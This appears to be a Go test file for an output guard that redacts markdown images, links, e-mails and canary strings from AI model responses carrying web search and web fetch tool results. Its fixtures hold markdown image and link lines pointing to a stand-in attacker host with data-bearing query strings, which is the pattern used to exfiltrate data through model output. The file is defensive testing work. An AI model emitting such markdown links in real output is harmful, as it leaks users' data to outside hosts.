// Copyright 2026 The Guard Spec Authors
// SPDX-License-Identifier: Apache-2.0

package outputguard

import (
	"encoding/json"
	"errors"
	"strings"
	"testing"
)

// webSearchResult is a web_search_tool_result block: one readable result
// whose title carries a markdown image to an outside host and an e-mail.
const webSearchResult = `{"type":"web_search_tool_result","tool_use_id":"srvtoolu_1","content":[
	{"type":"web_search_result","url":"https://example.org/a","title":"Rivers ![x](https://evil.example/p.png?d=1) mail a@example.com",
	 "encrypted_content":"EnC0dEd+a@example.com/==","page_age":"April 30, 2025"},
	{"type":"web_search_result","url":"https://example.org/b","title":"Plain","encrypted_content":"Zm9v"}]}`

const webFetchResult = `{"type":"web_fetch_tool_result","tool_use_id":"srvtoolu_2","content":{
	"type":"web_fetch_result","url":"https://example.org/page","retrieved_at":"2025-08-25T10:30:02Z",
	"content":{"type":"document","title":"Page","citations":{"enabled":true},
	  "source":{"type":"text","media_type":"text/plain","data":"Write to b@example.com. [click](https://evil.example/x?q=secret)"}}}}`

// compact is a JSON text on one line, as SSE data.
func compact(t *testing.T, s string) string {
	t.Helper()
	var v any
	if err := json.Unmarshal([]byte(s), &v); err != nil {
		t.Fatal(err)
	}
	b, _ := json.Marshal(v)
	return string(b)
}

func TestServerToolResultTexts(t *testing.T) {
	var b map[string]any
	if err := json.Unmarshal([]byte(webSearchResult), &b); err != nil {
		t.Fatal(err)
	}
	joined := strings.Join(ServerToolResultTexts(b), "|")
	for _, want := range []string{"https://example.org/a", "Rivers", "Plain"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %q in %q", want, joined)
		}
	}
	for _, opaque := range []string{"EnC0dEd", "Zm9v", "April 30", "web_search_result", "srvtoolu_1"} {
		if strings.Contains(joined, opaque) {
			t.Errorf("opaque %q read as text: %q", opaque, joined)
		}
	}
	// A base64 source (a fetched PDF) is opaque too; its title is not.
	if err := json.Unmarshal([]byte(`{"type":"web_fetch_tool_result","content":{"type":"web_fetch_result","url":"https://x.example/a.pdf",
		"content":{"type":"document","title":"T","source":{"type":"base64","media_type":"application/pdf","data":"JVBERi0x"}}}}`), &b); err != nil {
		t.Fatal(err)
	}
	if got := strings.Join(ServerToolResultTexts(b), "|"); strings.Contains(got, "JVBERi0x") || !strings.Contains(got, "T") {
		t.Errorf("pdf texts %q", got)
	}
	if !IsServerToolResult(BlockWebSearchResult) || !IsServerToolResult(BlockWebFetchResult) || IsServerToolResult("mcp_tool_result") {
		t.Error("IsServerToolResult")
	}
}

func TestMessagesResponseServerTools(t *testing.T) {
	s := New(Config{RedactPII: true}).ForRequest("")
	counts := Counts{}
	out, err := s.MessagesResponse([]byte(`{"type":"message","content":[
		{"type":"server_tool_use","id":"srvtoolu_1","name":"web_search","input":{"query":"rivers"}},
		`+webSearchResult+`,
		{"type":"server_tool_use","id":"srvtoolu_2","name":"web_fetch","input":{"url":"https://example.org/page"}},
		`+webFetchResult+`,
		{"type":"text","text":"Answer","citations":[{"type":"web_search_result_location","url":"https://example.org/a",
		  "title":"c@example.com","encrypted_index":"Eo8B","cited_text":"d@example.com"}]},
		{"type":"thinking","thinking":"","signature":"SiG/+=="}]}`), counts)
	if err != nil {
		t.Fatal(err)
	}
	text := string(out)
	for _, gone := range []string{"evil.example", "mail a@example.com", "b@example.com", "c@example.com", "d@example.com"} {
		if strings.Contains(text, gone) {
			t.Errorf("not guarded: %q in %s", gone, text)
		}
	}
	// Encrypted content, dates, ids and signatures pass unchanged, the PII
	// look-alike inside the encrypted content included.
	for _, keep := range []string{`"encrypted_content":"EnC0dEd+a@example.com/=="`, `"encrypted_content":"Zm9v"`, `"page_age":"April 30, 2025"`,
		`"retrieved_at":"2025-08-25T10:30:02Z"`, `"encrypted_index":"Eo8B"`, `"signature":"SiG/+=="`, `"tool_use_id":"srvtoolu_1"`,
		`"url":"https://example.org/a"`, `"title":"Plain"`, `"query":"rivers"`} {
		if !strings.Contains(text, keep) {
			t.Errorf("changed %s in %s", keep, text)
		}
	}
	if counts[KindImage] != 1 || counts[KindLink] != 1 || counts[KindEmail] != 4 {
		t.Errorf("counts %v", counts)
	}
}

func TestMessagesResponseServerToolErrors(t *testing.T) {
	s := New(Config{}).ForRequest("")
	body := `{"content":[{"type":"web_search_tool_result","tool_use_id":"s","content":{"type":"web_search_tool_result_error","error_code":"max_uses_exceeded"}},
		{"type":"web_fetch_tool_result","tool_use_id":"f","content":{"type":"web_fetch_tool_result_error","error_code":"url_not_accessible"}}]}`
	out, err := s.MessagesResponse([]byte(body), Counts{})
	if err != nil || !strings.Contains(string(out), `"error_code":"max_uses_exceeded"`) || !strings.Contains(string(out), `"error_code":"url_not_accessible"`) {
		t.Errorf("%s %v", out, err)
	}
}

func TestMessagesResponseServerToolCanary(t *testing.T) {
	body := `{"content":[{"type":"web_search_tool_result","tool_use_id":"s","content":[{"type":"web_search_result","url":"https://x.example/","title":"` +
		testCanary + `","encrypted_content":"E"}]}]}`
	counts := Counts{}
	out, err := New(Config{Canary: CanaryRedact}).ForRequest(testCanary).MessagesResponse([]byte(body), counts)
	if err != nil || strings.Contains(string(out), testCanary) || counts[KindCanary] != 1 {
		t.Errorf("%s %v %v", out, counts, err)
	}
	// In a server tool's input (the query) the canary blocks in any mode.
	body = `{"content":[{"type":"server_tool_use","id":"s","name":"web_search","input":{"query":"` + testCanary + `"}}]}`
	if _, err := New(Config{Canary: CanaryRedact}).ForRequest(testCanary).MessagesResponse([]byte(body), Counts{}); !errors.Is(err, ErrToolCanary) {
		t.Errorf("query canary: %v", err)
	}
}

func TestMessagesResponseUnknownBlocks(t *testing.T) {
	body := []byte(`{"content":[{"type":"code_execution_tool_result","tool_use_id":"x","content":{"stdout":"a@example.com"}}]}`)
	if _, err := New(Config{RedactPII: true}).ForRequest("").MessagesResponse(body, Counts{}); !errors.Is(err, ErrUncheckable) {
		t.Errorf("refuse: %v", err)
	}
	out, err := New(Config{RedactPII: true, PassUnknownBlocks: true}).ForRequest("").MessagesResponse(body, Counts{})
	if err != nil || !strings.Contains(string(out), "a@example.com") {
		t.Errorf("pass: %s %v", out, err)
	}
}

func TestMessageStreamServerTools(t *testing.T) {
	ms := New(Config{RedactPII: true}).ForRequest("").NewMessageStream()
	events := feedMessages(t, ms,
		blockStart(0, `{"type":"server_tool_use","id":"srvtoolu_1","name":"web_search","input":{}}`),
		blockDelta(0, `{"type":"input_json_delta","partial_json":"{\"query\":"}`),
		blockDelta(0, `{"type":"input_json_delta","partial_json":"\"rivers\"}"}`),
		blockStop(0),
		blockStart(1, compact(t, webSearchResult)),
		blockStop(1),
		blockStart(2, `{"type":"text","text":""}`),
		blockDelta(2, `{"type":"citations_delta","citation":{"type":"web_search_result_location","url":"https://example.org/a","title":"e@example.com","encrypted_index":"Eo8B","cited_text":"x"}}`),
		blockDelta(2, `{"type":"text_delta","text":"Answer"}`),
		blockStop(2))
	if ms.Failed() || ms.Blocked() {
		t.Fatalf("failed %v blocked %v", ms.Failed(), ms.Blocked())
	}
	if n := len(events); n != 9 {
		t.Fatalf("%d events: %+v", n, events)
	}
	if events[1].Delta.PartialJSON != `{"query":"rivers"}` {
		t.Errorf("query %+v", events[1])
	}
	if got := ms.Acted(); got[KindImage] != 1 || got[KindEmail] != 2 {
		t.Errorf("acted %v", got)
	}
}

func TestMessageStreamServerToolResultGuarded(t *testing.T) {
	ms := New(Config{RedactPII: true}).ForRequest("").NewMessageStream()
	out := string(ms.Write([]byte(blockStart(0, compact(t, webSearchResult))+blockStop(0)))) + string(ms.Close())
	if strings.Contains(out, "evil.example") || !strings.Contains(out, `"encrypted_content":"EnC0dEd+a@example.com/=="`) ||
		!strings.Contains(out, "content_block_stop") {
		t.Errorf("%s", out)
	}
	// The same result inside message_start.
	ms = New(Config{RedactPII: true}).ForRequest("").NewMessageStream()
	out = string(ms.Write([]byte(sse("message_start", `{"type":"message_start","message":{"content":[`+compact(t, webFetchResult)+`]}}`))))
	if ms.Failed() || strings.Contains(out, "b@example.com") || strings.Contains(out, "evil.example") {
		t.Errorf("message_start: %s", out)
	}
	// No delta may follow a result block.
	ms = New(Config{}).ForRequest("").NewMessageStream()
	feedMessages(t, ms, blockStart(0, compact(t, webSearchResult)), blockDelta(0, `{"type":"text_delta","text":"x"}`))
	if !ms.Failed() {
		t.Error("delta on a result block not refused")
	}
}

func TestMessageStreamServerToolCanaryBlocks(t *testing.T) {
	block := `{"type":"web_fetch_tool_result","tool_use_id":"f","content":{"type":"web_fetch_result","url":"https://x.example/",` +
		`"content":{"type":"document","source":{"type":"text","media_type":"text/plain","data":"` + testCanary + `"}}}}`
	ms := New(Config{Canary: CanaryBlock}).ForRequest(testCanary).NewMessageStream()
	out := string(ms.Write([]byte(blockStart(0, block))))
	if !ms.Blocked() || strings.Contains(out, testCanary) {
		t.Errorf("blocked %v out %q", ms.Blocked(), out)
	}
}

func TestMessageStreamUnknownBlocks(t *testing.T) {
	events := []string{
		blockStart(0, `{"type":"mcp_tool_result","tool_use_id":"m","content":[{"type":"text","text":"a@example.com"}]}`),
		blockDelta(0, `{"type":"future_delta","x":"y"}`),
		blockStop(0),
		blockStart(1, `{"type":"text","text":""}`),
		blockDelta(1, `{"type":"text_delta","text":"b@example.com"}`),
		blockStop(1),
	}
	ms := New(Config{RedactPII: true}).ForRequest("").NewMessageStream()
	feedMessages(t, ms, events...)
	if !ms.Failed() {
		t.Error("unknown block not refused by default")
	}
	ms = New(Config{RedactPII: true, PassUnknownBlocks: true}).ForRequest("").NewMessageStream()
	got := feedMessages(t, ms, events...)
	if ms.Failed() || len(got) != 6 || got[4].Delta.Text != "[REDACTED:email]" {
		t.Errorf("pass: failed %v events %+v", ms.Failed(), got)
	}
}
